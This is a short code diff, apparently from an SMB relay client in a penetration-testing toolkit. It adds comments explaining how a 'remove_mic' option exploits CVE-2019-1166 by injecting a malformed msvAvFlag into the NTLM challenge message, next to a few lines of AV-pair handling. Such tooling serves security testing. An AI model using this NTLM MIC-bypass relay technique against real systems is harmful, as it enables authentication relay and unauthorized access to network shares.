@@ -327,6 +327,9 @@ class SMBRelayClient(ProtocolClient):
 
         self.negotiateMessage = negotiateMessage
         if self.serverConfig.remove_mic:
+            # This section will exploit CVE-2019-1166 by injecting an 'msvAvFlag' into the CHALLENGE_MESSAGE with length 0x8
+            # instead of length 0x4. It is possible that in this case the authentication succeed but then you get an access denied when trying
+            # to access shares.
             av_pairs = AV_PAIRS(challenge['TargetInfoFields'])
 
             avFlagsPair = pack("<q", 0)
